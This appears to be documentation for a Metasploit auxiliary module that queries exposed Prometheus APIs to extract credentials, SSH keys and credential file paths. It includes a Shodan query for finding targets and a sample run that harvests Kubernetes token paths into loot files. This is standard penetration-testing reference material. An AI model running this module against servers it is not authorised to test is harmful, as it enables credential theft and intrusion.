## Vulnerable Application

This module utilizes Prometheus' API calls to gather information about
the server's configuration, and targets. Fields which may contain
credentials, or credential file names are then pulled out and printed.

Targets may have a wealth of information, this module will print the following
values when found:
`__meta_gce_metadata_ssh_keys`, `__meta_gce_metadata_startup_script`,
`__meta_gce_metadata_kube_env`, `kubernetes_sd_configs`,
`_meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration`,
`__meta_ec2_tag_CreatedBy`, `__meta_ec2_tag_OwnedBy`

Shodan search: `"http.favicon.hash:-1399433489"`

A docker image is [available](https://hub.docker.com/r/prom/prometheus) however
this basic configuration has almost no interest data. Configuring it can be tricky
as it may not start w/o being able to contact the contacted services.

## Verification Steps

1. Install the application or find one on the Internet
1. Start msfconsole
1. Do: `use auxiliary/gather/prometheus_api_gather`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get any valuable information

## Options

## Scenarios

### Prometheus 2.39.1

```
msf6 auxiliary(gather/prometheus_api_gather) > set rhosts 11.111.11.111
rhosts => 11.111.11.111
msf6 auxiliary(gather/prometheus_api_gather) > set rport 80
rport => 80
msf6 auxiliary(gather/prometheus_api_gather) > run
[*] Running module against 11.111.11.111

[*] 11.111.11.111:80 - Checking build info
[+] Prometheus found, version: 2.39.1
[*] 11.111.11.111:80 - Checking status config
[+] YAML config saved to /root/.msf4/loot/20230815174315_default_11.111.11.111_PrometheusYAML_982929.yaml
[+] Credentials
===========

  Name                       Config         Host  Port  Public/Username  Private/Password/Token                               Notes
  ----                       ------         ----  ----  ---------------  ----------------------                               -----
  kubernetes-apiservers      authorization              Bearer           /var/run/secrets/kubernetes.io/serviceaccount/token
  kubernetes-nodes           authorization              Bearer           /var/run/secrets/kubernetes.io/serviceaccount/token
  kubernetes-nodes-cadvisor  authorization              Bearer           /var/run/secrets/kubernetes.io/serviceaccount/token

[*] 11.111.11.111:80 - Checking targets
[+] JSON targets saved to /root/.msf4/loot/20230815174315_default_11.111.11.111_PrometheusJSON_145604.json
[*] 11.111.11.111:80 - Checking status flags
[+] Config file: /etc/config/prometheus.yml
[*] Auxiliary module execution completed
```
